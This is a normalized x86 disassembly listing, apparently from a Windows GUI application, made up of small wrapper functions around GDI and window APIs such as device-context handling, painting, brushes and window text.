xor eax eax
mov edx [ eax ]
xor ecx ecx
cmp [ esi + 0x4 ] 0xe151
sete cl
push ecx
mov ecx eax
call [ edx + 0xe8 ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ esi ]
push eax
mov ecx esi
call [ edx ]
pop esi
retn 0x4
sub_446a70
push 0x0
push ecx
call sub_44691b
test eax eax
je r-xdata
retn 0x4
mov edx [ eax ]
xor ecx ecx
cmp [ esp + 0x4 ] 0xe151
sete cl
push ecx
mov ecx eax
call [ edx + 0xec ]
push 0x1
pop eax
sub_446a9a
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
retn 0x8
mov ecx [ eax ]
push 0x1
mov edx [ ecx + 0x5c ]
pop ecx
cmp [ edx + 0x1e ] 0xffff
jne r-xdata
mov [ eax + 0x10 ] ecx
cmp [ eax + 0x14 ] ecx
je r-xdata
xor ecx ecx
sub_446ac5
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x4 ] ecx
push esi
mov ecx [ ebx + 0x70 ]
push edi
test ecx ecx
je r-xdata
call sub_420710
push [ ebx + 0x88 ]
lea edi [ ebx + 0x88 ]
mov esi eax
push 0x0
mov ecx esi
mov eax [ esi ]
call [ eax + 0xd0 ]
mov eax [ edi ]
push 0x1
mov ecx esi
push [ eax + 0xc ]
call sub_4504ca
mov edi [ ebp - 0x4 ]
mov ecx edi
call sub_43fcfb
cmp esi eax
je r-xdata
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x100 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x58 ]
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0xc8 ]
push 0x0
push 0xe001
push 0x362
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push [ esi + 0x1c ]
call [ UpdateWindow@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x14
mov eax [ edi ]
push edi
push edi
push 0x1
mov ecx edi
call [ eax + 0xe4 ]
sub_446b98
mov eax sub_463e26
call sub_42dc88
push esi
call sub_4535a1
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_447ab1
call sub_441e77
push 0x48
mov ebx eax
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_4434bc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_441e77
pop ebx
sub_446c1f
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push 0x1
call sub_446b98
push edi
lea ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] edi
call sub_43d586
mov [ eax ] esi
mov eax [ esi ]
push [ esi + 0x4 ]
mov ecx esi
call [ eax + 0xc ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_446c56
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_446b98
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_43d5d6
sub_446c9d
mov eax sub_463e38
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_446c56
push eax
call [ DeleteDC@IAT ]
sub_446cf1
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_446d22
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_446d77
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_44774c
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_446db3
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_44774c
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_446df9
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446e28
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446e56
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetPolyFillMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446e84
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetROP2@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446eb2
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetStretchBltMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446ee0
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446f0f
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_446f3d
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_446f89
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_446fd5
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_447021
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_447079
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4470c5
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_447111
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_447179
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectClipRgn@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_4471b9
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx [ ExcludeClipRect@IAT ]
push edi
mov edi ecx
xor eax eax
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
je r-xdata
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
push ecx
call ebx
pop edi
pop esi
pop ebx
retn 0x4
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
push edi
call ebx
sub_4471fb
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx [ IntersectClipRect@IAT ]
push edi
mov edi ecx
xor eax eax
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
je r-xdata
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
push ecx
call ebx
pop edi
pop esi
pop ebx
retn 0x4
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
push edi
call ebx
sub_44723d
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ MoveToEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_447289
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esi + 0x4 ]
call [ LineTo@IAT ]
pop esi
retn 0x8
cmp [ esi + 0x4 ] eax
je r-xdata
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push eax
call [ MoveToEx@IAT ]
sub_4472be
push ebx
push esi
mov esi ecx
or ebx 0xffffffff
push edi
mov edi [ SetTextAlign@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0x10 ]
push eax
call edi
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x4
push [ esp + 0x10 ]
push esi
call edi
mov ebx eax
sub_4472f3
push esi
mov esi ecx
push r--data
call [ GetModuleHandleA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x78
or esi 0xffffffff
call [ SetLastError@IAT ]
push [ esi + 0x4 ]
call eax
mov esi eax
jmp r-xdata
mov eax esi
pop esi
retn
sub_447329
push esi
push edi
mov esi ecx
push r--data
call [ GetModuleHandleA@IAT ]
push r--data
push eax
xor edi edi
call [ GetProcAddress@IAT ]
cmp eax edi
je r-xdata
cmp [ esp + 0xc ] edi
je r-xdata
push [ esp + 0xc ]
push [ esi + 0x4 ]
call eax
mov edi eax
jmp r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push 0x78
or edi 0xffffffff
call [ SetLastError@IAT ]
sub_44736f
push ebx
push ebp
mov ebp [ ScreenToClient@IAT ]
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
push edi
push [ esi + 0x1c ]
call ebp
lea ebx [ edi + 0x8 ]
push ebx
push [ esi + 0x1c ]
call ebp
mov ecx esi
call sub_441659
test eax __dos_header
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ edi ]
mov ecx [ ebx ]
mov [ edi ] ecx
mov [ ebx ] eax
sub_4473ab
push ebx
push ebp
mov ebp [ ClientToScreen@IAT ]
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
push edi
push [ esi + 0x1c ]
call ebp
lea ebx [ edi + 0x8 ]
push ebx
push [ esi + 0x1c ]
call ebp
mov ecx esi
call sub_441659
test eax __dos_header
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ edi ]
mov ecx [ ebx ]
mov [ edi ] ecx
mov [ ebx ] eax
sub_4473e7
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x8 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
push [ ebp - 0x8 ]
call sub_42e67b
pop ecx
push eax
push [ ebp - 0x10 ]
call sub_42e67b
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
pop ecx
push eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
call sub_42e67b
pop ecx
push eax
push [ ebp - 0xc ]
call sub_42e67b
pop ecx
push eax
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_447450
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
mov esi ecx
push eax
push [ esi + 0x8 ]
call [ GetWindowExtEx@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x8 ]
call [ GetViewportExtEx@IAT ]
push [ ebp - 0x8 ]
call sub_42e67b
pop ecx
push eax
push [ ebp - 0x10 ]
call sub_42e67b
mov esi [ ebp + 0x8 ]
mov edi [ MulDiv@IAT ]
pop ecx
push eax
push [ esi ]
call edi
push [ ebp - 0x4 ]
mov [ esi ] eax
call sub_42e67b
pop ecx
push eax
push [ ebp - 0xc ]
call sub_42e67b
pop ecx
push eax
push [ esi + 0x4 ]
call edi
mov [ esi + 0x4 ] eax
pop edi
pop esi
leave
retn 0x4
sub_4474b9
mov eax sub_463e4c
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_446b68
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
test eax eax
mov [ esi ] r--data
je r-xdata
push eax
mov [ esi + 0x10 ] eax
call [ GetDC@IAT ]
push eax
mov ecx esi
call sub_446c1f
test eax eax
jne r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_447818
sub_44752b
mov eax sub_463e60
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_446c56
push eax
push [ esi + 0x10 ]
call [ ReleaseDC@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_446c9d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44756d
mov eax sub_463e74
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_446b68
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
test eax eax
mov [ esi ] r--data
je r-xdata
push eax
mov [ esi + 0x10 ] eax
call [ GetWindowDC@IAT ]
push eax
mov ecx esi
call sub_446c1f
test eax eax
jne r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_447818
sub_4475df
mov eax sub_463e88
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_446c56
push eax
push [ esi + 0x10 ]
call [ ReleaseDC@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_446c9d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_447621
mov eax sub_463e9c
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_446b68
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
lea ecx [ esi + 0x14 ]
mov eax [ eax + 0x1c ]
push ecx
push eax
mov [ esi + 0x10 ] eax
call [ BeginPaint@IAT ]
push eax
mov ecx esi
call sub_446c1f
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_447818
sub_447693
mov eax sub_463eb0
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x14 ]
push eax
push [ esi + 0x10 ]
call [ EndPaint@IAT ]
mov ecx esi
call sub_446c56
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_446c9d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_4476da
mov eax sub_463ec6
call sub_42dc88
push esi
call sub_4535a1
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_447ab1
call sub_441e77
push 0x48
mov ebx eax
call sub_441e89
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_4434bc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_441e77
pop ebx
sub_447761
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push 0x1
call sub_4476da
push edi
lea ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] edi
call sub_43d586
push 0x1
mov [ eax ] esi
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_44778e
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4476da
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_43d5d6
sub_4477ce
mov eax sub_463ed8
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ esi + 0x4 ] 0x0
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call [ CreateSolidBrush@IAT ]
push eax
mov ecx esi
call sub_447761
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_447818
sub_447831
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0x8 ]
call sub_44384a
test eax eax
je r-xdata
leave
retn 0x8
push esi
push edi
lea eax [ ebp - 0x100 ]
push 0xa
push eax
call sub_42e6a3
mov edi [ ebp + 0xc ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x100 ]
push 0x20
add edi 0x1c
push eax
push edi
call [ lstrcpynA@IAT ]
push 0x1
pop eax
pop edi
pop esi
lea eax [ esi + 0x1 ]
push eax
call sub_42d7e5
pop ecx
mov [ edi ] eax
push 0x48
push [ rw-data ]
push eax
call [ MulDiv@IAT ]
mov [ edi ] eax
and [ esi ] 0x0
sub_4478a9
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_4478f3
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp - 0x20 ]
push 0x20
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
leave
retn 0x8
sub_44791e
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_447993
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_447a04
push ebx
push esi
push edi
call [ GetFocus@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
push 0x3
push esi
call sub_4478a9
mov ebx [ GetParent@IAT ]
test eax eax
jne r-xdata
test edi edi
je r-xdata
push esi
call ebx
mov esi eax
cmp esi edi
je r-xdata
push 0x0
push 0x0
push 0x14f
push esi
call [ SendMessageA@IAT ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
push 0x2
push esi
call sub_4478a9
test eax eax
je r-xdata
push edi
call ebx
mov edi eax
call [ GetDesktopWindow@IAT ]
cmp edi eax
je r-xdata
sub_447a7b
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_447ab1
push esi
call sub_453349
mov esi eax
test esi esi
je r-xdata
call sub_43b7b5
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
